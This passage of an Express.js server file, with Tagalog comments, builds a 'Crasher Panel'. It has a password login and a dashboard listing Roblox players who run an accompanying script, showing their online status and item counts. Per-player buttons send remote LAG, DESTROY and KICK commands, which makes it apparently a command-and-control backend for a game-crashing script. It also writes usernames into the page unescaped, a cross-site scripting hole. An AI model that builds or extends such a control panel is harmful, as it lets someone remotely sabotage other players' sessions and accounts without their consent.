app.post('/login', (req, res) => {
  if (req.body.password === PASSWORD) {
    req.session.loggedIn = true;
    res.redirect('/');
  } else {
    res.redirect('/login?error=1');
  }
});

app.get('/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/login');
});

// ===== DASHBOARD =====
app.get('/', isAuth, (req, res) => {
  const now = Date.now();
  // I-compute ang online status para sa lahat ng users
  for (const [id, data] of Object.entries(users)) {
    data.online = (now - data.lastHeartbeat) <= OFFLINE_TIMEOUT;
  }

  // Pagbukud-bukurin: online muna
  const sorted = Object.entries(users).sort((a, b) => {
    if (a[1].online && !b[1].online) return -1;
    if (!a[1].online && b[1].online) return 1;
    return 0;
  });

  let rows = '';
  for (const [userId, data] of sorted) {
    const c = data.commands || {};
    const statusClass = data.online ? 'online' : 'offline';
    const statusText = data.online ? '🟢 Online' : '🔴 Offline';
    rows += `
      <tr>
        <td>
          <strong>${data.username || 'Unknown'}</strong>
          <span class="status ${statusClass}">${statusText}</span><br>
          <span style="font-size:11px;color:#666;">${userId}</span>
        </td>
        <td style="text-align:center;">${data.brainrots ? data.brainrots.length : 0}</td>
        <td style="text-align:center;">
          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
            <input type="hidden" name="id" value="${userId}">
            <input type="hidden" name="cmd" value="lag_n">
            <button class="cmd-btn ${c.lag_n ? 'active-lagn' : ''}" type="submit">LAG_N</button>
          </form>
          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
            <input type="hidden" name="id" value="${userId}">
            <input type="hidden" name="cmd" value="lag_c">
            <button class="cmd-btn ${c.lag_c ? 'active-lagc' : ''}" type="submit">LAG_C</button>
          </form>
          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
            <input type="hidden" name="id" value="${userId}">
            <input type="hidden" name="cmd" value="destroy">
            <button class="cmd-btn ${c.destroy ? 'active-destroy' : ''}" type="submit">💀 DESTROY</button>
          </form>
          <form style="display:inline-block;margin:2px;" method="POST" action="/cmd">
            <input type="hidden" name="id" value="${userId}">
            <input type="hidden" name="cmd" value="kick">
            <button class="cmd-btn ${c.kick ? 'active-kick' : ''}" type="submit">👢 KICK</button>
          </form>
        </td>
      </tr>
    `;
  }
  if (!rows) rows = `<tr><td colspan="3" style="text-align:center;color:#666;">No players yet. Run the script in Roblox.</td></tr>`;

  res.send(`
    <!DOCTYPE html>
    <html>
    <head><title>Crasher Panel</title>
    <style>
      * { margin:0; padding:0; box-sizing:border-box; }
      body { background:#0a0a0a; font-family:'Segoe UI',sans-serif; padding:20px; color:#eee; }
      .container { max-width:1300px; margin:0 auto; background:#141414; border-radius:24px; padding:30px; border:1px solid #2a2a2a; box-shadow:0 0 30px rgba(0,0,0,0.8); }
      .header { display:flex; justify-content:space-between; align-items:center; border-bottom:1px solid #222; padding-bottom:15px; margin-bottom:25px; flex-wrap:wrap; }
      .header h1 { color:#00d4ff; font-size:28px; }
      .header h1 small { font-size:16px; color:#666; margin-left:12px; font-weight:normal; }
      .header a { color:#aaa; text-decoration:none; padding:8px 22px; border:1px solid #333; border-radius:30px; transition:0.2s; }
      .header a:hover { background:#222; color:#fff; }
